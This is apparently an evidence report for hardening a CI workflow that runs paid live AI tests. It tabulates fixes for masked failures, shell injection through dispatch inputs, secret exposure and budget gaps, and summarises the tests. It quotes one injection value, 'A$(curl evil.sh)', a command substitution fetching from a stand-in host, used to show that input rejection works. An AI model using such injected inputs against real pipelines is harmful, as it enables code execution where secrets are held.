# V2.1.1 Phase A: live-test infrastructure (evidence)

Starting point: `opus/daedelus-v2-1-activation-hardening` @ `7011cfd` (V2.1 application code
`733c1b6`). The old workflow is kept for comparison as `live.yml.before_v2_1_1`.

## Defects found in the V2.1 live path, and their fixes

| # | Defect (V2.1) | Effect | Fix (V2.1.1) | Test |
|---|---|---|---|---|
| 1 | `pytest … \|\| true` on the Claude live tests; `\|\| true` on both connector commands | failures masked: green job | `\|\| true` removed; one runner step whose exit code is the verdict | `test_live_workflow_has_no_failure_masking_or_input_interpolation` |
| 2 | `bench-v21` and `connectors-live` exit 0 when **blocked** | a run without credentials was green | `daedelus live-run`: BLOCKED → exit 1; only all-PASS → exit 0 | tests 3, 12 |
| 3 | `--tasks "${{ inputs.tasks }}"` and `--video ${{ inputs.video }}` inside `run:` | shell injection by anyone allowed to dispatch | inputs only via `env:`; allowlist validation in a secret-less first job | tests 8, 8b, 9, 9b, workflow test |
| 4 | the live pytest suites skip (not fail) without credentials | "skipped" read as fine | live gates are now runner gates with explicit BLOCKED | test 3 |
| 5 | secrets in the job-level step env of the benchmark steps; setup steps share the job | broader exposure than needed | secrets only on the single `Live gates` step | workflow test |
| 6 | refused, truncated, malformed and schema-invalid responses not charged | budget undercounts real spend | billing ledger: each response billed on arrival | test 5, `test_failure_injection_v21` |
| 7 | timed-out calls charged as free | as above | one call of unknown cost | `test_model_timeout_and_rate_limit_change_nothing` |
| 8 | flat 0.1× cache-read price; Haiku long-prompt tier ignored | cost misstated | documented per-model cache prices; tier | `test_anthropic_usage_cost_fallback_and_request_id` |
| 9 | Gemini price unknown, but the $ cap was presented as a bound | false sense of a spending limit | an unpriced provider is BLOCKED unless `allow_unpriced`; bounds stated in the manifest | test 7 |
| 10 | Gemini output size unbounded | one call could be very long | `max_output_tokens` 16,000 | — |
| 11 | task E's video analysis ran outside any budget | unbudgeted live call | analysis under the run budget, absorbed by the campaign | — |
| 12 | no aggregate budget across tasks and modes | 10 runs × $2 with nothing above it | `CampaignBudget` (60 calls / $5 / 1.5M tokens / 1 h by default; dispatch inputs bounded) | test `campaign_budget_exhaustion` |
| 13 | no concurrency limit, no artifact retention | parallel paid runs; 90-day artifacts | `concurrency: live-verification` (queued, never cancelled), retention 14 days | workflow test |
| 14 | no secret scrubbing of evidence | a secret echoed in an error would be uploaded | `redact.scrub_tree` over every output | test 10 |
| 15 | the benchmark could run with no live call and still be "live" if any call happened elsewhere | false live claim | per task, every run must make a live call and use no recorded response | `test_bench_gate_classification_through_the_real_benchmark` |

## Required Phase A tests (handoff §8): `phase_a_tests.log`, 49 passed

1. requested test succeeds → PASS (`test_1`)
2. assertion fails → FAIL, exit 1 (`test_2`)
3. missing key → BLOCKED, exit 1, zero calls (`test_3`)
4. rate limit → FAIL, `retriable: true`, not PASS (`test_4`)
5. malformed JSON → FAIL, and the billed reply is charged (`test_5`)
6. invalid model operation → FAIL, artifact unchanged: only the creation revision (`test_6`)
7. unknown price → BLOCKED (`pricing`), or with approval a run that shows `cost_complete: false`
   (`test_7`)
8. malicious task input → rejected, exit 2, no gate reached (`test_8`, 12 cases; `test_8b`,
   9 more)
9. malicious video input → rejected (`test_9`, 11 cases; `test_9b`: host resolving to the
   metadata address)
10. secret in simulated error output → redacted from every file (`test_10`)
11. unrequested provider → NOT RUN (`test_11`)
12. one provider passes, another fails → aggregate FAIL (`test_12`)

All of them go through `live_runner.main` (the workflow's entry point) with fake live providers
in the provider registry. They exercise validation, orchestration, classification, the
manifest, scrubbing and the exit code, not isolated helpers.

## Local runs in this container (no credentials present)

* `no_credentials_run/`: claude and gemini, smoke and bench A–E. All 12 requested gates are
  BLOCKED (credentials); 0 calls; **exit 1**.
* `rejected_input/`: `LIVE_TASKS='A$(curl evil.sh)'` → `input_rejected`, **exit 2**.

## Controls that could not be verified from here

GitHub environment protection (required reviewers, deployment-branch policy, environment-scoped
secrets) is account configuration. It is documented in `docs/LIVE_AI_TESTING.md` §6 and remains
**unverified**. The workflow is also **not dispatchable yet**: `main` contains no workflows, and
GitHub dispatches only workflows that exist on the default branch.
